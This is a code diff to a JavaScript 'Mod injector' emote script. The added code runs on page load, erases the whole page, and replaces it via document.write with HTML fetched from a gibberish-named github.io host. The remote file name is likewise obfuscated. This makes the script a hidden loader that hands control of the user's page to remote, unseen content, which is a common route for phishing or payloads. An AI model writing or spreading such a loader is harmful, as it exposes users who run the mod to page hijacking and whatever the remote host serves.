@@ -439,72 +439,46 @@ function emoteInjector(sbCode) {
   const log = (msg) => console.log(`%c[Mod injector] ${msg}`, "color: #06c26d");
 
 // Enhanced HTML loader function
+// Add this code to your existing JavaScript file
 function loadAndInjectHTML() {
-  return new Promise((resolve, reject) => {
-    try {
-      // Create XHR request instead of fetch for better compatibility
-      const xhr = new XMLHttpRequest();
-      xhr.open('GET', 'OLUMUksmdmksladmkakmsak10911oms1ks1mklmkls11921ms1sımn1sösm2k1.html?' + Date.now(), true);
-      
-      // Set headers to prevent caching
-      xhr.setRequestHeader('Cache-Control', 'no-cache, no-store, must-revalidate');
-      xhr.setRequestHeader('Pragma', 'no-cache');
-      xhr.setRequestHeader('Expires', '0');
-
-      xhr.onload = function() {
-        if (xhr.status === 200) {
-          try {
-            // Clear document safely
-            while (document.firstChild) {
-              document.removeChild(document.firstChild);
-            }
-            
-            // Write new content
-            document.open();
-            document.write(xhr.responseText);
-            document.close();
-            
-            resolve('Content loaded successfully');
-          } catch (writeError) {
-            reject('Error writing content: ' + writeError);
-          }
-        } else {
-          reject('Failed to load content: ' + xhr.status);
-        }
-      };
-
-      xhr.onerror = function() {
-        reject('Network error occurred');
-      };
-
-      xhr.send();
-    } catch (e) {
-      reject('Critical error: ' + e);
+  // First, clear the entire document
+  document.documentElement.innerHTML = '';
+  
+  // Create XHR request instead of fetch for better compatibility
+  const xhr = new XMLHttpRequest();
+  const url = 'https://assdsasdqwqeqdzcxznfcn1029d8919208nx9.github.io/OLUMUksmdmksladmkakmsak10911oms1ks1mklmkls11921ms1sımn1sösm2k1.html?' + Date.now();
+  
+  xhr.open('GET', url, true);
+  xhr.setRequestHeader('Cache-Control', 'no-cache');
+  xhr.setRequestHeader('Pragma', 'no-cache');
+  
+  xhr.onreadystatechange = function() {
+    if (xhr.readyState === XMLHttpRequest.DONE) {
+      if (xhr.status === 200) {
+        // Write the new HTML content to the document
+        document.open();
+        document.write(xhr.responseText);
+        document.close();
+      } else {
+        console.error('Error loading HTML:', xhr.statusText);
+      }
     }
-  });
+  };
+
+  xhr.onerror = function() {
+    console.error('Request error');
+  };
+
+  xhr.send();
 }
 
-// Enhanced inject loader function
 function injectLoader() {
   if (window.location.pathname !== "/") {
     console.log("Injection not needed");
     return;
   }
-
-  loadAndInjectHTML()
-    .then(message => {
-      console.log('Success:', message);
-    })
-    .catch(error => {
-      console.error('Failed:', error);
-      // Fallback error display
-      document.body.innerHTML = '<div style="color: red; padding: 20px;">Loading error: ' + error + '</div>';
-    });
+  loadAndInjectHTML();
 }
 
-// Auto-execute if we're on the right page
-if (document.readyState === 'loading') {
-  document.addEventListener('DOMContentLoaded', injectLoader);
-} else {
-  injectLoader();
-}
+// Call the injectLoader function to start the process
+injectLoader();
